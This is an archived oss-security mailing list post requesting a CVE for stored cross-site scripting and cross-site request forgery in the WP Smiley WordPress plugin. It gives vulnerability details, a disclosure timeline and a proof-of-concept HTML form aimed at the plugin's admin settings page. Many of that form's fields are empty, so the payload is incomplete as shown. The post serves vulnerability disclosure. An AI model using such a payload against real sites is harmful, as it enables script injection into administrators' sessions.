  oss-security - CVE request: XSS and CSRF in WP Smiley plugin for WordPress            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Fri, 29 May From: Henri Salo <Henri.Salo@...u.com> To: <oss-security@...ts.openwall.com> CC: <cve-assign@...re.org>, <joni.hauhia@...u.com> Subject: CVE request: XSS and CSRF in WP Smiley plugin for WordPress  -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  We found following vulnerabilities with Joni Hauhia. Could you assign CVE for these issues, thanks.  Product: WordPress plugin wp-smiley Plugin page: https://wordpress.org/plugins/wp-smiley/ Developer: (no contact information available) Vulnerability Type:   CWE-79: Cross-site scripting   Cross-Site Request Forgery Vulnerable Versions: Fixed Version: N/A Solution Status: N/A Vendor Notification: Public Disclosure:  Vulnerability details:  WP Smiley plugin for WordPress contains a flaw that allows a stored cross-site-scripting (XSS) attack. This flaw exists because the smilies4wp.php script does not validate input properly before returning it to users. This allows an authenticated remote attacker to create a specially crafted request that would execute arbitrary script code in a user's browser session within the trust relationship between their browser and the server.  Editor-level user account can use this cross-site scripting vulnerability against Administrator-level users.  Root cause:  The software incorrectly sanitizes user-controllable input before it is placed in output that is used as a web page that is served to users.  Proof-of-concept:  This vulnerability can be demonstrated with following cross-site request forgery PoC below.  Notes:  Other parameters are also possibly insecure (not tested). Other versions not tested.  References:  Cross-site Scripting:     http://cwe.mitre.org/data/definitions/79.html     https://scapsync.com/cwe/CWE-79     https://en.wikipedia.org/wiki/Cross-site_scripting  Cross-Site Request Forgery:             https://en.wikipedia.org/wiki/Cross-site_request_forgery  Timeline:  Notification about vulnerability for WordPress plugins team CVE request from MITRE (no response) WordPress plugins team responds and disables plugin from archive Sent emails to sites, which I knew using this plugin Asked status of CVE from MITRE (no response) Public disclosure  CSRF XSS PoC:  <html>   <body>     <form action="https://example.com/wp-admin/options-general.php?page=smilies4wp.php" method="POST">       <input type="hidden" value="&quot;&gt;" />       <input type="hidden" value="comment" />       <input type="hidden" />       <input type="hidden" value="Less&lt;&lt;" />       <input type="hidden" value="1" />       <input type="hidden" value="1" />       <input type="hidden" value="1" />       <input type="hidden" />       <input type="hidden" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" value="" />       <input type="hidden" />       <input type="submit" value="Submit request" />     </form>   </body> </html>  - --  Henri Salo Security Specialist, Nixu Oy Mobile: 40 PL 39 FIN (Keilaranta 15) Espoo, Finland -----BEGIN PGP SIGNATURE----- Version: GnuPG v1  =chYh -----END PGP SIGNATURE-----  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      